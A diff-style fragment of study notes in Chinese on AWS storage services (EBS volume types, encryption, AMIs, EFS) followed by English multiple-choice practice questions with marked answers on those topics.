-</li>
-<li><p>存儲性能和一致性非常敏感的數據工作負載</p>
-</li>
-<li><p>io1(4GiB-16GiB(最大可調配))</p>
-<ul>
-<li>對於Nitro EC2實例，最大PIOPS約為64000</li>
-<li>對於其他類型的實例，最大PIOPS約為32000</li>
-<li>可以獨立於存儲大小來增加調配的IOPS</li>
-</ul>
-</li>
-<li><p>io2 Block Express(4GiB-64TiB)</p>
-<ul>
-<li>Sub-millisecond 等級的延遲</li>
-<li>獲得大量的最大IOPS<ul>
-<li>256000 with an IOPS:GiB ratio of 1000:1</li>
-</ul>
-</li>
-<li>性能非常高的I&#x2F;O類型的Volume</li>
-</ul>
-</li>
-<li><p>支持EBS多連接功能</p>
-<p>  <img src="/img/EBS5.png" alt="Untitled"></p>
-<ul>
-<li>允許將相同的EBS Volume 連接到同一可用性區域中的多個EC2實例</li>
-<li>僅適用io1、io2系列的EBS Volume</li>
-<li>每個實例都將擁有對高性能Volume 的完全讀寫權限，意味著可以同時讀寫</li>
-<li>在clustered Linux Application(Teradata 或你的應用程式必須管理併發寫入操作) 將獲得更高的應用程式可用性</li>
-<li>僅在指定可用性區域中可用</li>
-<li>不允許將EBS Volume 從一個連接到另一個<ul>
-<li>多連接的另一個限制是一次<strong>最多可以連接16個EC2實例</strong></li>
-</ul>
-</li>
-<li>要使其正常工作，必須使用一個支持集群的文件系統<ul>
-<li>不同於XFS、EXT4</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>io1&#x2F;io2 Block Express (SSD)</p>
-<ul>
-<li>性能最高的SSD Volume</li>
-<li>用於任務關鍵型低延遲和高吞吐量工作負載</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Hard Disk Drives<ul>
-<li>不能是Boot Volume</li>
-<li>僅適用於以前類型的Volume</li>
-<li>125GiB - 16 TiB</li>
-<li>st1 (HDD)<ul>
-<li>經吞吐量優化的HDD</li>
-<li>適合大數據、數據倉庫、日誌處理</li>
-<li>最大吞吐量為每秒500MB&#x2F;s</li>
-<li>最大IOPS 為500</li>
-<li>為頻繁訪問的吞吐量密集型工作負載而設計的低成本HDD Volume</li>
-</ul>
-</li>
-<li>sc1 (HDD)<ul>
-<li>成本最低的HDD Volume</li>
-<li>設計用於訪問頻率較低的工作負載</li>
-<li>用於歸檔數據<ul>
-<li>不經常訪問的數據</li>
-</ul>
-</li>
-<li>當需要盡可能低的成本時可以使用它</li>
-<li>最大吞吐量為每秒250 MiB&#x2F;s</li>
-<li>最大IOPS為250</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>如何定義EBS Volume ?<ul>
-<li>考慮 Size |Throughput IOPS (I&#x2F;O Ops Per Sec)</li>
-</ul>
-</li>
-<li>通用SSD與預配置IOPS SSD(如果需要數據庫)與st1、sc1(如果需要高吞吐量和最低成本)</li>
-<li>如果想要獲得超過32000 IOPS，則需要具有io1 or io2的EC2 Nitro</li>
-</ul>
-<h3 id="EBS-Encryption"><a href="#EBS-Encryption" class="headerlink" title="EBS Encryption"></a>EBS Encryption</h3><ul>
-<li>當創建並加密EBS Volume 時<ul>
-<li>Volume 中的靜態數據被加密</li>
-<li>實例和Volume 之間傳輸的所有數據都被加密</li>
-<li>所有快照都將被加密</li>
-<li>從快照創建的所有Volume 都將被加密</li>
-</ul>
-</li>
-<li>所有加密和解密機制都透明的處理<ul>
-<li>一切都由EC2和EBS在後台處理</li>
-</ul>
-</li>
-<li>對延遲的影響非常小</li>
-<li>利用了KMS(AES-256)的密鑰</li>
-<li>Copy 未加密的快照時，就啟用了加密</li>
-<li>如何加密未加密的EBS Volume<ul>
-<li>創建該Volume 的EBS快照</li>
-<li>複製功能加密EBS快照</li>
-<li>從快照創建一個新的EBS Volume</li>
-<li>該Volume 也將被加密</li>
-<li>將加密的 Volume 連接到原始實例</li>
-</ul>
-</li>
-</ul>
-<h3 id="AMI-Amazon-Machine-Image"><a href="#AMI-Amazon-Machine-Image" class="headerlink" title="AMI &gt; Amazon Machine Image"></a>AMI &gt; Amazon Machine Image</h3><p><img src="/img/EBS6.png" alt="Untitled"></p>
-<ul>
-<li>可以使用AWS創建的AMI</li>
-<li>自訂義自己的AMI<ul>
-<li>自己的軟體配置</li>
-<li>定義和設置操作系統</li>
-<li>設定監控工具</li>
-<li>獲得更快的啟動時間和配置時間</li>
-</ul>
-</li>
-<li>針對特定區域構建<ul>
-<li>可跨區域複製</li>
-</ul>
-</li>
-<li>可從不同類型的AMI啟動EC2實例</li>
-<li>可以從AWS Marketplace AMI啟動EC2實例<ul>
-<li>由其他人創建的AMI</li>
-<li>可能由其他人銷售</li>
-<li>也可以自己在AWS市場上創建一個銷售AMI的業務</li>
-</ul>
-</li>
-<li>AMI Process<ul>
-<li>啟動一個EC2實例並對其自訂義</li>
-<li>停止實例確保數據完整性正確</li>
-<li>根據實例構建AMI，這樣還可以在後台創建EBS快照</li>
-<li>從其他AMI啟動實例</li>
-</ul>
-</li>
-</ul>
-<h3 id="EFS-彈性文件系統-Elastic-File-System-Service"><a href="#EFS-彈性文件系統-Elastic-File-System-Service" class="headerlink" title="EFS 彈性文件系統 Elastic File System Service"></a>EFS 彈性文件系統 Elastic File System Service</h3><p><img src="/img/EBS7.png" alt="Untitled"></p>
-<ul>
-<li><p>託管NFS (Network file system)</p>
-</li>
-<li><p>網路文件系統</p>
-</li>
-<li><p>可以掛載到許多EC2實例上</p>
-<ul>
-<li>EC2可以位於不同的可用性區域</li>
-</ul>
-</li>
-<li><p>高度可用，可自動擴展，昂貴</p>
-</li>
-<li><p>按使用量付費</p>
-<ul>
-<li>用於EFS中的每GB數據</li>
-</ul>
-</li>
-<li><p>不必提前配置容量</p>
-</li>
-<li><p>內容管理、web 服務、數據共享、Wordpress</p>
-</li>
-<li><p>內部使用NFSv4.1 協議</p>
-</li>
-<li><p>為了控制EFS的訪問，需要設置安全群組</p>
-</li>
-<li><p>只兼容基於Linux的AMI，而不是Windows</p>
-</li>
-<li><p>使用KMS在EFS驅動器中啟用靜態加密</p>
-</li>
-<li><p>它是Linux上的標準文件系統，因此使用POSIX系統，具有標準文件API</p>
-</li>
-<li><p>EFS規模</p>
-<ul>
-<li>可以獲得數千個併發NFS客戶端和10GB+&#x2F;s吞吐量</li>
-<li>自動擴展到PB級的網路文件系統</li>
-</ul>
-</li>
-<li><p>創建EFS網路文件系統時設置<strong>性能模式</strong></p>
-<ul>
-<li>通用(默認)<ul>
-<li>延遲敏感的用例(WEB server, CMS..)</li>
-<li>最大化吞吐量<ul>
-<li>最大的I&#x2F;O</li>
-<li>高延遲的網路文件系統</li>
-<li>更高的吞吐量</li>
-<li>高度並行</li>
-<li>大數據應用程式或媒體處理需求</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>吞吐量模式</p>
-<p>  <img src="/img/EBS8.png" alt="Untitled"></p>
-<ul>
-<li>Bursting 爆裂<ul>
-<li>一個TB，每秒50MiB 加上每秒100MiB</li>
-</ul>
-</li>
-<li>Provisioned 資源調配<ul>
-<li>無論存儲大小如何都要設置吞吐量</li>
-<li>隨存儲容量的增加，前一個系統的吞吐量也在增長</li>
-<li>通過配置可以為1TB的存儲容量提供每秒1GB的吞吐量</li>
-</ul>
-</li>
-<li>Elsatic<ul>
-<li>根據工作負載自動調整吞吐量</li>
-<li>適合不可預測的工作負載</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>存儲類型</p>
-<ul>
-<li><p>生命週期管理功能</p>
-</li>
-<li><p>Standard : 允許在一定天數後將文件移動到不同的存儲層</p>
-<ul>
-<li>頻繁訪問的文件標準層</li>
-</ul>
-</li>
-<li><p>Infrequent access (EFS-IA):</p>
-<ul>
-<li>可以檢索文件</li>
-<li>存儲文件的成本低</li>
-<li>不頻繁訪問的EFS-IA層</li>
-</ul>
-</li>
-<li><p>Archive 歸檔存儲層:</p>
-<p>  <img src="/img/EBS9.png" alt="Untitled"></p>
-<ul>
-<li>針對很少訪問的數據</li>
-<li>數據存儲在該層上的成本低，50% cheaper</li>
-<li>要在存儲層之間自動移動文件，可以實施生命週期策略</li>
-<li>允許定義文件在多少天後應移動到哪個層</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>可用性和持久性方面</p>
-<ul>
-<li>Standard<ul>
-<li>當具有多個可用區設置</li>
-<li>EFS跨多個可用區</li>
-<li>生產工作負載非常有用</li>
-</ul>
-</li>
-<li>One Zone<ul>
-<li>只想進行開發並希望有更便宜的選擇</li>
-<li>可以選擇一個區域，將提供一個可用性區域，仍然可以在其中進行備份，並與IA類型的存儲層兼容(EFS One Zone-IA)</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>通過使用正確的EFS存儲類型，可以節省高達90%的成本</p>
-</li>
-<li><p>EBS volumes</p>
-<p>  <img src="/img/EBS10.png" alt="Untitled"></p>
-<ul>
-<li>一次連接到一個實例<ul>
-<li>除了使用io1和io2類型volumes的多連接功能邊緣情況外</li>
-</ul>
-</li>
-<li>在AZ級別鎖定</li>
-<li>gp2<ul>
-<li>如果磁盤大小增加，IO將增加</li>
-</ul>
-</li>
-<li>gp3 &amp; io1<ul>
-<li>獨立於磁盤大小增加IO</li>
-</ul>
-</li>
-<li>要跨AZ遷移EBS，需要拍快照<ul>
-<li>將快照恢復到另一個AZ</li>
-<li>EBS volumes備份，將使用大量IO，不應該在應用程式處理大量流量時運行他們，因為可能影響性能</li>
-</ul>
-</li>
-<li>如果EC2被終止，實例的路由EBS volumes將默認被終止<ul>
-<li>可以禁用該行為</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>EFS volumes</p>
-<p>  <img src="/img/EBS11.png" alt="Untitled"></p>
-<ul>
-<li>網路文件系統</li>
-<li>目標是將其連接到可用性區域中的數百個實例</li>
-<li>對於一個EFS，可以在不同的AZ中擁有不同的掛載目標</li>
-<li>多個實例可以一起共享該文件系統</li>
-<li>只適用Linux(POSIX)</li>
-<li>EFS價位高於EBS，但可以利用存儲層節省成本</li>
-<li>對於實例存儲，它是物理連接到EC2實例的，因此如果失去了EC2實例，你也會失去存儲</li>
-</ul>
-</li>
-</ul>
-<p><strong>You have just terminated an EC2 instance in <code>us-east-1a</code>, and its attached EBS volume is now available. Your teammate tries to attach it to an EC2 instance in <code>us-east-1b</code> but he can’t. What is a possible cause for this?</strong></p>
-<ul>
-<li><input disabled="" type="checkbox"> • <strong>He’s missing IAM permissions</strong></li>
-<li><input disabled="" type="checkbox"> • <strong>EBS volumes are locked to an AWS Region</strong></li>
-<li><input checked="" disabled="" type="checkbox"> • <strong>EBS volumes are locked to an Availability Zone</strong></li>
-</ul>
-<p><strong>You have launched an EC2 instance with two EBS volumes, Root volume type and the other EBS volume type to store the data. A month later you are planning to terminate the EC2 instance. What’s the default behavior that will happen to each EBS volume?</strong></p>
-<ul>
-<li><input disabled="" type="checkbox"> • <strong>Both the root volume type and the EBS volume type will be deleted</strong></li>
-<li><input checked="" disabled="" type="checkbox"> • <strong>The Root volume type will be deleted and the EBS volume type will not be deleted</strong></li>
-<li><input disabled="" type="checkbox"> • <strong>The root volume type will not be deleted and the EBS volume type will be deleted</strong></li>
-<li><input disabled="" type="checkbox"> • <strong>Both the root volume type and the EBS volume type will not be deleted</strong></li>
-</ul>
-<p><strong>You can use an AMI in N. Virginia Region <code>us-east-1</code> to launch an EC2 instance in any AWS Region.</strong></p>
-<ul>
-<li><input disabled="" type="checkbox"> • <strong>True</strong></li>
-<li><input checked="" disabled="" type="checkbox"> • <strong>False</strong></li>
-</ul>
-<blockquote>
-<p>AMIs are built for a specific AWS Region, they’re unique for each AWS Region. You can’t launch an EC2 instance using an AMI in another AWS Region, but you can copy the AMI to the target AWS Region and then use it to create your EC2 instances.</p>
-</blockquote>
-<p><strong>Which of the following EBS volume types can be used as boot volumes when you create EC2 instances?</strong></p>
-<ul>
-<li><input disabled="" type="checkbox"> • <strong><code>gp2</code>, <code>gp3</code>, <code>st1</code>, <code>sc1</code></strong></li>
-<li><input checked="" disabled="" type="checkbox"> • <strong><code>gp2</code>, <code>gp3</code>, <code>io1</code>, <code>io2</code></strong></li>
-<li><input disabled="" type="checkbox"> • <strong><code>io1</code>, <code>io2</code>, <code>st1</code>, <code>sc1</code></strong></li>
-</ul>
-<p><strong>What is EBS Multi-Attach?</strong></p>
-<ul>
-<li><input disabled="" type="checkbox"> • <strong>Attach the same EBS volume to multiple EC2 instances in multiple AZs</strong></li>
-<li><input disabled="" type="checkbox"> • <strong>Attach multiple EBS volumes in the same AZ to the same EC2 instance</strong></li>
-<li><input checked="" disabled="" type="checkbox"> • <strong>Attach the same EBS volume to multiple EC2 instances in the same AZ</strong></li>
-</ul>
-<blockquote>
-<p>Using EBS Multi-Attach, you can attach the same EBS volume to multiple EC2 instances in the same AZ. Each EC2 instance has full read&#x2F;write permissions.</p>
-</blockquote>
-<ul>
-<li><input disabled="" type="checkbox"> • <strong>Attach multiple EBS volumes in multiple AZs to the same EC2 instance</strong></li>
-</ul>
-<p><strong>You would like to encrypt an unencrypted EBS volume attached to your EC2 instance. What should you do?</strong></p>
-<ul>
-<li><input checked="" disabled="" type="checkbox"> • <strong>Create an EBS snapshot of your EBS volume. Copy the snapshot and tick the option to encrypt the copied snapshot. Then, use the encrypted snapshot to create a new EBS volume</strong></li>
-<li><input disabled="" type="checkbox"> • <strong>Select your EBS volume, choose Edit Attributes, then tick the Encrypt using KMS option</strong></li>
-<li><input disabled="" type="checkbox"> • <strong>Create a new encrypted EBS volume, then copy data from your unencrypted EBS volume to the new EBS volume.</strong></li>
-<li><input disabled="" type="checkbox"> • <strong>Submit a request to AWS Support to encrypt your EBS volume</strong></li>
-</ul>
-<p><strong>You have a fleet of EC2 instances distributes across AZs that process a large data set. What do you recommend to make the same data to be accessible as an NFS drive to all of your EC2 instances?</strong></p>
-<ul>
-<li><input disabled="" type="checkbox"> • <strong>Use EBS</strong></li>
-<li><input checked="" disabled="" type="checkbox"> • <strong>Use EFS</strong></li>
-<li><input disabled="" type="checkbox"> • <strong>Use an Instance Store</strong></li>
-</ul>
-<p><strong>You would like to have a high-performance local cache for your application hosted on an EC2 instance. You don’t mind losing the cache upon the termination of your EC2 instance. Which storage mechanism do you recommend as a Solutions Architect?</strong></p>
-<ul>
-<li><input disabled="" type="checkbox"> • <strong>EBS</strong></li>
-<li><input disabled="" type="checkbox"> • <strong>EFS</strong></li>
-<li><input checked="" disabled="" type="checkbox"> • <strong>Instance Store</strong></li>
-</ul>
-<p><strong>You are running a high-performance database that requires an IOPS of 310,000 for its underlying storage. What do you recommend?</strong></p>
-<ul>
-<li><input disabled="" type="checkbox"> • <strong>Use an EBS <code>gp2</code> drive</strong></li>
-<li><input disabled="" type="checkbox"> • <strong>Use an EBS <code>io1</code> drive</strong></li>
-<li><input checked="" disabled="" type="checkbox"> • <strong>Use an EC2 Instance Store</strong></li>
-</ul>
-<blockquote>
-<p>You can run a database on an EC2 instance that uses an Instance Store, but you’ll have a problem that the data will be lost if the EC2 instance is stopped (it can be restarted without problems). One solution is that you can set up a replication mechanism on another EC2 instance with an Instance Store to have a standby copy. Another solution is to set up backup mechanisms for your data. It’s all up to you how you want to set up your architecture to validate your requirements. In this use case, it’s around IOPS, so we have to choose an EC2 Instance Store.</p>
-</blockquote>
-<ul>
-<li><input disabled="" type="checkbox"> • <strong>Use an EBS <code>io2</code> Block Express drive</strong></li>
-</ul>
 
       
     </div>
